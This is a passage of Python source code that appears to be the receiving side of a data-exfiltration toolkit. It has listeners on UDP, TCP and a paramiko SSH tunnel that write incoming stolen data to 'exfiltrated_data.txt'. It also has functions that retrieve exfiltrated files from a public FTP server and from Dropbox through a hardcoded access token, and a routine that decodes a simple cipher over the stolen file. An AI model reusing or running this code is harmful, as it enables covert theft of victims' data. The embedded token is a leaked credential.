    tunnel.send((input("Enter a search term")).encode("utf-8"))
Start()
def attackerUDP():
    host = "127.0.0.1"
    port = 6321
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((host,port))
    print("listening")
    #s.listen(2)#waiting for two connections at a time
    new_file = open((os.getcwd()+"\\exfiltrated_data.txt"),'w')
    print(os.getcwd()+"\\exfiltrated_data.txt")
    #c, addr = s.accept() #C=Connection socket and address
    #print("Connection formed with "+str(addr))
    data = s.recvfrom(1024)[0].decode('utf-8')
    print(data)
    if not data:
        print("No Data")
        s.close()
    else:
        lineNum = 0
        while data != "DONE":
            data = s.recvfrom(1024)[0].decode('utf-8')
            lineNum += 1
            print('LINE '+str(lineNum)+': ' + data, end = ' -->') #Printing Info
            print('writing data to file...')
            new_file.write(data+'\n')
            print('complete!')
        new_file.close()
        print('data exfiltrated and file closed')
        s.close()
def attackerTCP():
    host = "127.0.0.1"
    port = 64321
    #TCP Conn
    s = socket.socket()
    s.bind((host,port))
    print("listening")
    s.listen(70)#waiting for two connections at a time
    new_file = open(os.getcwd()+"\\exfiltrated_data.txt",'w')
    print('new file created:'+(os.getcwd()+"\\exfiltrated_data.txt") )
    c, addr = s.accept() #C=Connection socket and address
    print("Connection formed with "+str(addr))
    data = c.recv(1024).decode('utf-8')
    if not data:
        print("No Data")
        s.close()
    else:
        lineNum = 0
        data = data.split('\n')
        for each in data:
            lineNum += 1
            print(str(addr)+'\nLINE '+str(lineNum)+': ' + each, end = ' -->') #Printing Info
            print('writing data to file...')
            new_file.write(each+'\n')
            print('complete!')
        new_file.close()
        print('data exfiltrated and file closed')
def grabFile():
    session = ftplib.FTP('demo.wftpserver.com','demo-user', 'demo-user')
    session.login('demo-user', 'demo-user') 
    #login("ftpuser","pwd")
    session.retrlines('LIST')     # list directory contents 
    session.cwd('upload')
    filename = '1combinedExfil.txt'
    localfile = open("stealing.txt", 'wb')
    session.retrbinary('RETR ' + filename, localfile.write, 1024)
    session.quit()
    localfile.close()
def FileRetr():
    User = dropbox.client.DropboxClient("7SeVe0XoVRAAAAAAAAAAB8G1v4FBYZoqZJWlHboxeu1U4PWTigmgn9pKUZDMjT-J")
    MDFolder = User.metadata('/')
    print( 'MD: ', MDFolder)
    f, MD = User.get_file_and_metadata('1combinedExfil.txt')
    out = open('Sto.txt', 'wb')
    out.write(f.read())
    out.close()
def decrypt(key,path):
    with open("X2combinedExfil.txt", "w") as fileFil2:
        for line in open( (path+"\\X1combinedExfil.txt"), 'r' ):
            for i, c in enumerate(line):
                KY1 = ord(key[4 % len(key)])
                Encr1 = ord(c)
                line2=(chr((Encr1 - KY1) % 129))
                fileFil2.write(line2)
def SSHTunnelRecieve():
    Thekey = paramiko.RSAKey.generate(1024)
    tcpSocketObj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcpSocketObj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
    tcpSocketObj.bind(('127.0.0.1', 22))
    tcpSocketObj.listen(100)
    print ('Waiting For Connection')
    client, addr = tcpSocketObj.accept()
    print ('Connection made with '+str(client)+" with the ip"+ str(addr))
    cliD = paramiko.Transport(client)
    cliD.load_server_moduli()
    cliD.add_server_key(Thekey)
    server = Interface()
    cliD.start_server(server=server)
    tunnel = cliD.accept(20)
    print ('Authenticated! Data exfil started')
    newFile = open((os.getcwd()+"\\exfiltrated_data.txt"),'w')
    tempText=""
    while tempText!="Quit":
        tempText=(tunnel.recv(1024).decode("utf-8"))
        newFile.write(tempText)
        print(tempText)
        if tempText=="Quit":
            print("Exfiltrated Data Recieved")
    tunnel.send('Success')
'''
